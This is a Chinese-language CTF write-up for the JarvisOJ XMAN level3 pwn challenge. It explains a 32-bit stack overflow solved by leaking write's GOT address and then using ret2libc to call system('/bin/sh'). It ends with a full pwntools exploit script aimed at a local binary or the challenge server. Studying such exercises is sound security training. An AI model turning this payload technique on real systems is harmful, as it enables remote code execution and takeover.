---
title: XMAN level3 の Write-Up
date: 2020-05-20 16:46:04
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- ROP
- Stack
---
## Introduction

这是JarvisOJ的PWN题部分[XMAN]level3的Write-Up，题目还是有点难度。题目中涉及到二次覆盖，ret2libc方法的使用，延迟绑定技术的理解和运用等知识点，建议先认真了解一下ROP链和延迟绑定技术原理。可以参考之前写的两篇Blog：[ROP Emporium の ret2win](https://coldwave96.github.io/2020/05/19/ret2win/)和[ret2libc && Lazy Binding](https://coldwave96.github.io/2020/05/19/LazyBinding/)。

<!-- more -->

## Step 1

程序运行截图：

![](/img/XMAN-level3/XMAN1.png)

checksec：32位程序，开启DEP保护

![](/img/XMAN-level3/XMAN2.png)

## Step 2

将程序拖到hopper disassembler中去发现程序中依然存在vulnerable_function函数，但是不再有system函数和‘/bin/sh’的字符串。

![](/img/XMAN-level3/XMAN3.png)

但是同时题目也给了libc-2.19.so，把该文件也拖到hopper中发现system函数：

![](/img/XMAN-level3/XMAN4.png)

通过ROPgadget找到libc-2.19.so中’/bin/sh’字符串的位置：

![](/img/XMAN-level3/XMAN5.png)

参考之前的栈溢出系列以及[ROP Emporium の ret2win](https://coldwave96.github.io/2020/05/19/ret2win/)，现在的思路就是vulnerable_function函数溢出去执行lib-2.19.so文件中的system函数，同时传入参数’/bin/sh’。

理想中的栈布局为：

![](/img/XMAN-level3/XMAN6.png)

说是vulnerable_function函数溢出，其实实际上是read函数溢出。所以我们需要将read函数的返回地址覆盖为system函数的入口地址，然后根据函数调用规则，设置一下system函数的返回地址为0xdeadbeef（毫无意义的地址），最后是system函数的参数即‘bin/sh’字符串的地址。

## Step 3

虽然我们通过libc-2.19.so文件可以得到system函数和’/bin/sh’字符串的偏移地址，但是不知道其在内存中的实际地址，所以我们需要想办法找到system函数和’/bin/sh’字符串在内存中的实际地址。

假设这样一个情况，我们已经知道test函数是通过延迟绑定（具体情况了解[ret2libc && Lazy Binding](https://coldwave96.github.io/2020/05/19/LazyBinding/)）调用libc.so中的test函数实现的，并且我们知道test函数在内存中的实际地址test_addr及其在libc.so中的偏移地址test_libc。

此时我们想直接调用一个程序中没但是存在于libc.so中的函数func，那么我们可以得到这样一个逻辑等式：

```
func_addr - func_libc = test_addr - test_libc
```

即函数在内存中地址和在libc中偏移地址两者的差相等，这个值可以理解为libc文件加载到内存中的基址。

根据这个题目中的情况，test函数我们选择write函数，替换func函数的位置即可获取system函数和’/bin/sh’字符串在内存中的实际地址。

首先我们要泄露获取write函数的真实地址，这个可以通过打印write在got表中的地址实现。

为了输出write_got对应的实际地址，需要构造下面的栈布局：

![](/img/XMAN-level3/XMAN7.png)

将read函数的返回地址覆盖为write_plt，设置write函数返回地址为vulnerable_function函数入口地址（原因下面会提到）。

之后是`write(int fd,const void*buf,size_t count)`函数的3个参数：

* 第一个参数是STDIN_FILENO即文件描述符，一般定义为0, 1，2；分别代表stdin(0，标准输入)，stdout(1，标准输出)，stderr(2，标准出错)

* 第二个参数是BUF即写入的字符串

* 第三个参数是每次写入的字节数

所以本次题目中write函数对应的3个参数分别为1，write_got和4。

这样我们就可以得到write函数实际地址，且由于每次程序运行我们获取到的write函数的地址是变化的，所以我们需要把信息泄漏和获取服务器控制权限在一次网络连接中完成。

实现方法是借助于两次缓冲区溢出，第一次缓冲区溢出泄漏write的地址之后，我们让EIP再次跳转到vulnerable_function来执行，这样就可以接着进行第二次缓冲区溢出的过程，此时执行`system("/bin/sh")`即可。

运行结果：

![](/img/XMAN-level3/XMAN8.png)

## Appendix

本地运行时优先装在本地系统中的libc库，导致实际装载库并非题目给出的lib-2.19.so文件。这样会造成本地地址错误，无法成功获得shell，本地可以通过添加一个判断模块解决这个问题，远程不存在这个问题。

EXP代码（已添加对加载的libc文件做判断的模块）：

```Python
# coding: utf-8
from pwn import *

local = 1 # 控制执行环境，0为远程，1为本地
if local:
sh = process('./level3')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
sh = remote('pwn2.jarvisoj.com', 9879)
libc = ELF('./libc-2.19.so')

elf = ELF('./level3')

writeplt = elf.plt['write']
writegot = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

writelibc = libc.symbols['write']
syslibc = libc.symbols['system']
shelllibc = libc.search('/bin/sh').next()

payload1 = 'a' * (0x88 + 0x4) + p32(writeplt) + p32(vuln_addr) + p32(1) + p32(writegot) + p32(4)

sh.recvuntil('Input:\n')
sh.sendline(payload1)

write_addr = u32(sh.recv(4))
sys_addr = write_addr - writelibc + syslibc
shell_addr = write_addr - writelibc + shelllibc

payload2 = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(shell_addr)

sh.recvuntil('Input:\n')
sh.sendline(payload2)

sh.interactive()
sh.close()
```
